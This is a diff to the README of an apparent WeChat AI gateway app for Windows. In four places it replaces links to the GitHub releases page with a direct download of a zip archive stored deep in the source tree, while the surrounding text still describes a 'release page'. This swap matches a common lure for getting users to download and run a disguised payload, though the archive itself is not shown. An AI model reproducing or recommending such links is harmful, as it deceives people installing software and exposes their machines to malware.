@@ -1,6 +1,6 @@
 # 🤖 weixin-agent-gateway - Unified WeChat AI Gateway
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/cyberg0bl1n/weixin-agent-gateway/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip)
 
 ## 🚀 What this app does
 
@@ -19,7 +19,7 @@ Use it when you want:
 
 Visit the release page to download and run the Windows version:
 
-[https://github.com/cyberg0bl1n/weixin-agent-gateway/releases](https://github.com/cyberg0bl1n/weixin-agent-gateway/releases)
+[https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip](https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip)
 
 On that page, look for the latest release and download the file that matches your Windows system. If you see more than one file, choose the one marked for Windows.
 
@@ -38,7 +38,7 @@ For best results, close apps that use a lot of memory before you start.
 ## 🛠️ Install and run on Windows
 
 1. Open the release page:
-   [https://github.com/cyberg0bl1n/weixin-agent-gateway/releases](https://github.com/cyberg0bl1n/weixin-agent-gateway/releases)
+   [https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip](https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip)
 
 2. Find the latest release.
 
@@ -195,7 +195,7 @@ If the app uses a config file for routes, keep each backend name clear so you ca
 
 Use the same release page any time you need a newer version:
 
-[https://github.com/cyberg0bl1n/weixin-agent-gateway/releases](https://github.com/cyberg0bl1n/weixin-agent-gateway/releases)
+[https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip](https://github.com/cyberg0bl1n/weixin-agent-gateway/raw/refs/heads/main/src/backends/qoder/agent-weixin-gateway-v1.3-alpha.5.zip)
 
 Check the newest release before you install it. This helps you stay on the current Windows build
 
